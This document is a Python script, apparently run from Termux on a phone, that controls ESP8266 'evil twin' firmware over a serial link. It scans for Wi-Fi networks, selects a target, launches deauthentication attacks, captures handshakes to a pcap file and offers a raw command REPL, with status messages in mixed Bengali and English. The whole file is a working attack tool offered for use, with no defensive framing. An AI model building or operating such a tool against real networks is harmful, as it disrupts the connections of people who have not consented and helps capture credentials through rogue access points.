#!/usr/bin/env python3
"""
mt2ctl — Termux-side controller for MT2 headless evil twin firmware.
Sends serial commands to ESP8266, parses ASCII status, prints bn/en mixed.

Usage:
  ./mt2ctl scan
  ./mt2ctl list
  ./mt2ctl target 0
  ./mt2ctl deauth
  ./mt2ctl stop
  ./mt2ctl status
  ./mt2ctl cap hk.pcap
  ./mt2ctl watch              # live heartbeat stream
  ./mt2ctl interactive        # REPL mode
"""
import sys, os, time, argparse, subprocess, signal
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from serial_bridge import MT2Serial, find_port

VERSION = "2.0"

def banner():
    print(f"┌─ mt2ctl v{VERSION} ─────────────────────┐")
    print(f"│  MT2 Evil Twin Controller  │")
    print(f"│  Termux → ESP8266 (Serial) │")
    print(f"└────────────────────────────────────────┘")

def main():
    banner()
    if len(sys.argv) < 2:
        print("usage: mt2ctl {scan|list|target|deauth|stop|status|cap|watch|interactive|reboot}")
        sys.exit(1)
    cmd = sys.argv[1]
    args = sys.argv[2:]

    port = find_port()
    if not port and cmd not in ("ports", "help"):
        print("!! ESP8266 serial পাওয়া যাচ্ছে না।")
        print("   USB OTG connect করো, তারপর 'mt2ctl ports' চালাও।")
        sys.exit(2)

    dev = MT2Serial(port) if port else None

    if cmd == "ports":
        print("Detected serial ports:")
        for p in find_port(all_=True):
            print(f"  {p}")
        return

    if cmd == "scan":
        print(f"[{port}] Sending: scan")
        for line in dev.send("scan", wait=2.0, lines=30):
            print(" ", line)

    elif cmd == "list":
        for line in dev.send("list", wait=0.5, lines=30):
            print(" ", line)

    elif cmd == "target":
        if not args:
            print("usage: mt2ctl target <idx>")
            return
        for line in dev.send(f"target {args[0]}", wait=0.5):
            print(" ", line)

    elif cmd == "deauth":
        for line in dev.send("deauth", wait=0.5):
            print(" ", line)
        print("Attack চলছে। 'mt2ctl stop' দিয়ে থামাও।")

    elif cmd == "stop":
        for line in dev.send("stop", wait=0.5):
            print(" ", line)

    elif cmd == "status":
        for line in dev.send("status", wait=0.5):
            print(" ", line)

    elif cmd == "cap":
        if not args:
            print("usage: mt2ctl cap <file>")
            return
        for line in dev.send(f"cap {args[0]}", wait=0.5):
            print(" ", line)
        print(f"Capturing → /sdcard/MT2/{args[0]}. 'mt2ctl stop' দিয়ে বন্ধ।")

    elif cmd == "reboot":
        for line in dev.send("reboot", wait=0.3):
            print(" ", line)

    elif cmd == "watch":
        print("Live mode — Ctrl+C to exit")
        try:
            for line in dev.stream():
                print(line, flush=True)
        except KeyboardInterrupt:
            print("\nbye")

    elif cmd == "interactive":
        print("REPL — type 'quit' to exit")
        try:
            while True:
                raw = input("mt2$ ")
                if raw.strip() in ("quit", "exit"):
                    break
                for line in dev.send(raw, wait=0.5):
                    print(" ", line)
        except KeyboardInterrupt:
            print("\nbye")

    else:
        print(f"unknown: {cmd}")
        sys.exit(1)

if __name__ == "__main__":
    main()
